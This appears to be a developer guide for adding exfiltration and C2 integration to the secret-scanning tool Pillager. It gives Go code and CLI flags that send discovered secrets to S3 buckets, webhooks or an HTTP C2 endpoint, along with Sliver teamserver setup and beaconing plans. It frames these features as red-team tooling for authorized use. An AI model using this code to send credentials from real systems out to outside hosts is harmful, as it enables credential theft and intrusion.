# Pillager Exfiltration Feature Implementation Guide

## Overview

This guide provides step-by-step instructions for implementing the exfiltration and C2 integration features proposed in [EXFILTRATION_PROPOSAL.md](./EXFILTRATION_PROPOSAL.md).

**Target Audience**: Developers implementing the proposed features

**Prerequisites**:
- Go 1.21+
- Familiarity with the Pillager codebase
- Understanding of AWS S3 API
- Basic knowledge of C2 frameworks (Sliver, Mythic, etc.)

---

## Phase 1: Core Exfiltration Framework

### Week 1-2: Foundation

#### 1.1 Package Structure

Create the following directory structure:

```
pkg/
├── exfil/
│   ├── exfil.go              # Core interfaces and types
│   ├── exfil_test.go          # Unit tests
│   ├── metadata.go            # Metadata generation
│   ├── filter.go              # Finding filters
│   ├── s3/
│   │   ├── s3.go              # S3 exfiltrator implementation
│   │   ├── s3_test.go         # S3 tests
│   │   ├── encryption.go      # Client-side encryption
│   │   ├── compression.go     # Compression utilities
│   │   └── config.go          # S3 configuration
│   ├── webhook/
│   │   ├── webhook.go         # Webhook exfiltrator
│   │   └── webhook_test.go
│   └── dns/
│       ├── dns.go             # DNS exfiltrator
│       └── dns_test.go
├── c2/
│   ├── c2.go                  # Core C2 interfaces
│   ├── c2_test.go
│   ├── beacon.go              # Beaconing scheduler
│   ├── tasks.go               # Task execution
│   ├── sliver/
│   │   ├── sliver.go          # Sliver integration
│   │   ├── sliver_test.go
│   │   └── grpc.go            # Sliver gRPC client
│   ├── mythic/
│   │   ├── mythic.go          # Mythic integration
│   │   └── mythic_test.go
│   └── http/
│       ├── http.go            # Generic HTTP C2
│       └── http_test.go
```

#### 1.2 Core Interface Implementation

**File: `pkg/exfil/exfil.go`**

Key tasks:
- [x] Define `Exfiltrator` interface (already completed in proposal)
- [ ] Implement `Registry` for exfiltrator factories
- [ ] Create configuration parsers (TOML, JSON, CLI flags)
- [ ] Implement metadata generation
- [ ] Create finding filter logic
- [ ] Write comprehensive unit tests

**Testing checklist**:
```bash
# Test interface compliance
go test ./pkg/exfil -v

# Test filter logic
go test ./pkg/exfil -run TestShouldExfiltrate

# Test metadata generation
go test ./pkg/exfil -run TestCreateMetadata
```

#### 1.3 Configuration System

**File: `pkg/exfil/config.go`**

Implement configuration loading from:
1. CLI flags (via Cobra)
2. Environment variables
3. TOML configuration file
4. Sensible defaults

Example implementation:

```go
package exfil

import (
	"github.com/spf13/viper"
)

// LoadConfig loads exfiltration configuration from multiple sources.
func LoadConfig() (*Config, error) {
	config := &Config{}

	// Set defaults
	viper.SetDefault("exfil.enabled", false)
	viper.SetDefault("exfil.mode", "stream")
	viper.SetDefault("exfil.retry.max_attempts", 3)

	// Load from config file
	if err := viper.ReadInConfig(); err != nil {
		// Config file not required
	}

	// Unmarshal into struct
	if err := viper.UnmarshalKey("exfil", config); err != nil {
		return nil, err
	}

	return config, nil
}
```

#### 1.4 Update CLI Commands

**File: `internal/commands/hunt.go`**

Add new flags for exfiltration:

```go
var (
	// Existing flags
	dedupe      bool
	entropy     float64
	format      string
	redact      bool
	templ       string
	interactive bool
	workers     int

	// NEW: Exfiltration flags
	exfilEnabled     bool
	exfilType        string
	exfilMode        string
	s3Bucket         string
	s3Region         string
	s3Endpoint       string
	s3Prefix         string
	encryptionKey    string
	filterRules      []string
	maxFindings      int
)

func init() {
	rootCmd.AddCommand(huntCmd)

	// Existing flags...

	// NEW: Exfiltration flags
	huntCmd.Flags().BoolVar(&exfilEnabled, "exfil", false, "enable exfiltration")
	huntCmd.Flags().StringVar(&exfilType, "exfil-type", "s3", "exfiltration type (s3, webhook, dns)")
	huntCmd.Flags().StringVar(&exfilMode, "exfil-mode", "stream", "exfiltration mode (stream, batch, archive)")

	// S3-specific flags
	huntCmd.Flags().StringVar(&s3Bucket, "s3-bucket", "", "S3 bucket name")
	huntCmd.Flags().StringVar(&s3Region, "s3-region", "us-east-1", "S3 region")
	huntCmd.Flags().StringVar(&s3Endpoint, "s3-endpoint", "", "S3 endpoint (for MinIO, etc.)")
	huntCmd.Flags().StringVar(&s3Prefix, "s3-prefix", "findings", "S3 object key prefix")

	// Encryption flags
	huntCmd.Flags().StringVar(&encryptionKey, "encryption-key", "", "encryption key (env:VAR, file:/path, inline:data)")

	// Filter flags
	huntCmd.Flags().StringSliceVar(&filterRules, "filter-rules", []string{}, "rule IDs to exfiltrate")
	huntCmd.Flags().IntVar(&maxFindings, "max-findings", 0, "maximum findings to exfiltrate")
}
```

---

## Phase 2: S3 Exfiltration

### Week 3-4: S3 Implementation

#### 2.1 AWS SDK Integration

**Dependencies to add** (`go.mod`):

```go
require (
	github.com/aws/aws-sdk-go-v2 v1.24.0
	github.com/aws/aws-sdk-go-v2/config v1.26.0
	github.com/aws/aws-sdk-go-v2/credentials v1.16.0
	github.com/aws/aws-sdk-go-v2/service/s3 v1.47.0
)
```

Install dependencies:
```bash
go get github.com/aws/aws-sdk-go-v2/config
go get github.com/aws/aws-sdk-go-v2/service/s3
```

#### 2.2 Encryption Implementation

**File: `pkg/exfil/s3/encryption.go`**

Implement AES-256-GCM encryption:

```go
package s3

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
)

// AESEncryptor implements AES-256-GCM encryption.
type AESEncryptor struct {
	key []byte
}

// NewAESEncryptor creates a new AES encryptor.
func NewAESEncryptor(key []byte) (*AESEncryptor, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("key must be 32 bytes for AES-256")
	}
	return &AESEncryptor{key: key}, nil
}

// Encrypt encrypts data using AES-256-GCM.
func (e *AESEncryptor) Encrypt(plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(e.key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// Decrypt decrypts data using AES-256-GCM.
func (e *AESEncryptor) Decrypt(ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(e.key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}
```

#### 2.3 Compression Implementation

**File: `pkg/exfil/s3/compression.go`**

Implement gzip and zstd compression:

```go
package s3

import (
	"bytes"
	"compress/gzip"
	"io"

	"github.com/klauspost/compress/zstd"
)

// GzipCompressor implements gzip compression.
type GzipCompressor struct{}

func (c *GzipCompressor) Compress(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)

	if _, err := gw.Write(data); err != nil {
		return nil, err
	}

	if err := gw.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func (c *GzipCompressor) Decompress(data []byte) ([]byte, error) {
	gr, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer gr.Close()

	return io.ReadAll(gr)
}

// ZstdCompressor implements Zstandard compression.
type ZstdCompressor struct {
	encoder *zstd.Encoder
	decoder *zstd.Decoder
}

func NewZstdCompressor() (*ZstdCompressor, error) {
	encoder, err := zstd.NewWriter(nil)
	if err != nil {
		return nil, err
	}

	decoder, err := zstd.NewReader(nil)
	if err != nil {
		return nil, err
	}

	return &ZstdCompressor{
		encoder: encoder,
		decoder: decoder,
	}, nil
}

func (c *ZstdCompressor) Compress(data []byte) ([]byte, error) {
	return c.encoder.EncodeAll(data, nil), nil
}

func (c *ZstdCompressor) Decompress(data []byte) ([]byte, error) {
	return c.decoder.DecodeAll(data, nil)
}
```

#### 2.4 Testing S3 Integration

**Integration test with MinIO**:

```bash
# Start MinIO for testing
docker run -d \
  -p 9000:9000 \
  -p 9001:9001 \
  --name minio-test \
  -e "MINIO_ROOT_USER=minioadmin" \
  -e "MINIO_ROOT_PASSWORD=minioadmin" \
  quay.io/minio/minio server /data --console-address ":9001"

# Create test bucket
mc alias set local http://localhost:9000 minioadmin minioadmin
mc mb local/test-bucket

# Run integration tests
go test ./pkg/exfil/s3 -tags=integration -v

# Test with pillager
pillager hunt ./testdata \
  --exfil s3 \
  --s3-bucket test-bucket \
  --s3-endpoint http://localhost:9000 \
  --s3-region us-east-1
```

---

## Phase 3: C2 Integration

### Week 5-6: C2 Framework

#### 3.1 Sliver Integration

**Install Sliver dependencies**:

```bash
# For Go client integration
go get github.com/bishopfox/sliver/protobuf
```

**Implementation checklist**:
- [ ] Implement mTLS configuration loading
- [ ] Create gRPC client connection
- [ ] Implement session registration
- [ ] Add finding transmission
- [ ] Implement beaconing
- [ ] Add task retrieval
- [ ] Test with Sliver teamserver

**Testing with Sliver**:

```bash
# Start Sliver teamserver (in separate terminal)
sliver-server

# Generate operator config
sliver > new-operator --name pillager-test --lhost localhost

# Test pillager integration
pillager hunt /target \
  --c2 sliver \
  --sliver-config ./pillager-test_localhost.cfg \
  --beacon-interval 60
```

#### 3.2 HTTP C2 Implementation

**File: `pkg/c2/http/http.go`**

Simple HTTP callback implementation:

```go
package http

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/c2"
)

type HTTPClient struct {
	url        string
	httpClient *http.Client
	headers    map[string]string
}

func NewHTTPClient(cfg c2.Config) (*HTTPClient, error) {
	url, _ := cfg.Options["url"].(string)
	headers, _ := cfg.Options["headers"].(map[string]string)

	return &HTTPClient{
		url: url,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
		headers: headers,
	}, nil
}

func (c *HTTPClient) SendFindings(ctx context.Context, findings []pillager.Finding) error {
	data, err := json.Marshal(findings)
	if err != nil {
		return err
	}

	req, err := http.NewRequestWithContext(ctx, "POST", c.url, bytes.NewReader(data))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")
	for k, v := range c.headers {
		req.Header.Set(k, v)
	}

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}

	return nil
}

// Implement other C2Client interface methods...
```

---

## Phase 4: CLI Integration

### Updating Hunt Command

**File: `internal/commands/hunt.go`**

Integrate exfiltration into the hunt workflow:

```go
func (cmd *huntCmd) RunE(cmd *cobra.Command, args []string) error {
	// ... existing setup code ...

	// Create scanner
	scanner, err := scanner.NewGitleaksScanner(*opts)
	if err != nil {
		return err
	}

	// NEW: Create exfiltrator if enabled
	var exfiltrator exfil.Exfiltrator
	if exfilEnabled {
		exfilConfig := createExfilConfig()
		exfiltrator, err = exfil.Create(exfilConfig)
		if err != nil {
			return fmt.Errorf("failed to create exfiltrator: %w", err)
		}
		defer exfiltrator.Close()

		// Health check
		if err := exfiltrator.Health(ctx); err != nil {
			return fmt.Errorf("exfiltration channel unhealthy: %w", err)
		}
	}

	// Scan for findings
	results, err := scanner.Scan()
	if err != nil {
		return err
	}

	// NEW: Exfiltrate findings if enabled
	if exfiltrator != nil {
		if err := exfiltrator.Exfiltrate(ctx, results); err != nil {
			return fmt.Errorf("exfiltration failed: %w", err)
		}
		fmt.Printf("[+] Successfully exfiltrated %d findings\n", len(results))
	}

	// Standard output
	return scanner.Reporter().Report(os.Stdout, results)
}

func createExfilConfig() exfil.Config {
	return exfil.Config{
		Type:    exfilType,
		Mode:    exfil.Mode(exfilMode),
		Enabled: exfilEnabled,
		Options: map[string]interface{}{
			"bucket":   s3Bucket,
			"region":   s3Region,
			"endpoint": s3Endpoint,
			"prefix":   s3Prefix,
		},
		Filters: exfil.FilterConfig{
			IncludeRules: filterRules,
			MaxFindings:  maxFindings,
		},
	}
}
```

---

## Testing Strategy

### Unit Tests

```bash
# Test all packages
go test ./... -v

# Test with coverage
go test ./pkg/exfil/... -cover
go test ./pkg/c2/... -cover

# Generate coverage report
go test ./... -coverprofile=coverage.out
go tool cover -html=coverage.out
```

### Integration Tests

Create `test/integration/` directory:

```
test/
└── integration/
    ├── s3_test.go          # S3 integration tests
    ├── c2_test.go          # C2 integration tests
    ├── e2e_test.go         # End-to-end tests
    └── docker-compose.yml  # Test infrastructure
```

**docker-compose.yml** for testing:

```yaml
version: '3.8'
services:
  minio:
    image: quay.io/minio/minio
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    command: server /data --console-address ":9001"

  http-c2-mock:
    image: mendhak/http-https-echo
    ports:
      - "8080:8080"
```

Run integration tests:

```bash
# Start test infrastructure
docker-compose -f test/integration/docker-compose.yml up -d

# Run integration tests
go test ./test/integration -tags=integration -v

# Cleanup
docker-compose -f test/integration/docker-compose.yml down
```

---

## Security Checklist

Before merging to main:

- [ ] All credentials loaded from environment (never hardcoded)
- [ ] TLS enabled by default for all network operations
- [ ] Client-side encryption tested and working
- [ ] Audit logging implemented
- [ ] Authorization warnings prominent in docs
- [ ] No secrets in test fixtures
- [ ] Dependency security scan passed
- [ ] Code review by security-focused developer
- [ ] Red team validation of features

Security scan commands:

```bash
# Dependency vulnerability scan
go list -json -m all | nancy sleuth

# Static analysis
golangci-lint run ./...

# Check for hardcoded secrets
gitleaks detect --source .
```

---

## Documentation Updates

### README.md

Add section:

```markdown
## Exfiltration Features (v2.0+)

⚠️ **AUTHORIZATION REQUIRED** - Exfiltration features are designed for authorized security testing only.

Pillager v2.0 adds active response capabilities:
- S3-compatible cloud exfiltration
- C2 framework integration (Sliver, Mythic, HTTP)
- Real-time beaconing
- Automated post-exploitation

See [EXFILTRATION_PROPOSAL.md](./EXFILTRATION_PROPOSAL.md) for full details.
```

### Create usage examples

**examples/s3-exfiltration/**:
- `basic-s3.sh` - Simple S3 upload
- `encrypted-s3.sh` - With encryption
- `minio-local.sh` - Using MinIO

**examples/c2-integration/**:
- `sliver-basic.sh` - Sliver integration
- `http-callback.sh` - HTTP C2
- `auto-tasks.toml` - Auto-task configuration

---

## Release Process

### Version Bump

Update version in:
- `VERSION` file
- `internal/commands/version.go`
- `README.md`
- `CHANGELOG.md`

### Changelog

```markdown
## [2.0.0] - 2025-XX-XX

### Added
- S3-compatible cloud exfiltration
- C2 framework integration (Sliver, Mythic, HTTP)
- Real-time beaconing and task execution
- Client-side encryption (AES-256-GCM)
- Compression support (gzip, zstd)
- Automated post-exploitation tasks
- DNS and ICMP exfiltration channels

### Security
- All network communication uses TLS by default
- Client-side encryption before upload
- Comprehensive audit logging
- Authorization requirement warnings

### Breaking Changes
- None (new features are opt-in)
```

### Git Tag

```bash
git tag -a v2.0.0 -m "Release v2.0.0 - Exfiltration & C2 Integration"
git push origin v2.0.0
```

---

## Rollout Plan

### Beta Release (Week 10-11)

1. Tag `v2.0.0-beta.1`
2. Release to limited audience (security researchers)
3. Gather feedback
4. Fix critical bugs

### Release Candidate (Week 11-12)

1. Tag `v2.0.0-rc.1`
2. Public announcement in security communities
3. Documentation review
4. Final security audit

### General Availability (Week 12)

1. Tag `v2.0.0`
2. Update all package managers
3. Blog post announcement
4. Conference talk submissions

---

## Metrics and Success Criteria

### Technical Metrics
- [ ] <1s latency for streaming exfiltration
- [ ] 99.9% successful upload rate
- [ ] Support 3+ C2 frameworks
- [ ] Zero hardcoded credentials
- [ ] 80%+ test coverage

### Adoption Metrics
- [ ] 1,000+ downloads in first month
- [ ] 5+ blog posts/mentions
- [ ] 100+ GitHub stars
- [ ] 3+ conference talk acceptances

---

## Support and Maintenance

### Issue Templates

Create `.github/ISSUE_TEMPLATE/exfiltration-bug.md`:

```markdown
---
name: Exfiltration Bug Report
about: Report a bug with S3 exfiltration or C2 integration
---

**Environment**
- Pillager version:
- Go version:
- OS:
- Exfiltration type (S3, C2, etc.):

**Authorization**
- [ ] I have explicit written authorization for this testing

**Bug Description**
[Clear description]

**Steps to Reproduce**
1. ...
2. ...

**Expected Behavior**
[What should happen]

**Actual Behavior**
[What actually happens]

**Logs**
```
[Relevant logs - REDACT SECRETS]
```
```

---

## Conclusion

This implementation guide provides a structured approach to building the exfiltration features. Follow the phases sequentially, ensuring each component is thoroughly tested before moving to the next.

**Remember**: These features are powerful and require responsible use. Always obtain explicit authorization before deployment.
